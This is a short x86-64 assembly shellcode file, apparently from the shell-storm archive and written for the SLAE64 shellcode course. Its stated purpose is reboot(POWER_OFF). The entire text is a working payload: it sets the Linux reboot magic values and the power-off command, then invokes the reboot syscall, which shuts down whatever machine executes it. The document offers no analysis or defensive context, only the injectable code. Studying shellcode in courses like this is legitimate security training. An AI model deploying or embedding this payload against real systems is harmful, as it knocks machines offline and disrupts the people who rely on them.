; From: http://shell-storm.org/shellcode/files/shellcode-602.php
; Filename: shellcode3.nasm
; Author:  SLAE64 - 1525
;
; Purpose: reboot(POWER_OFF)

section .text
    global _start
 
_start:
    mov edx, 0x4321fedc
    mov esi, 0x28121969
    mov edi, 0xfee1dead
    mov al,  0xa9
    syscall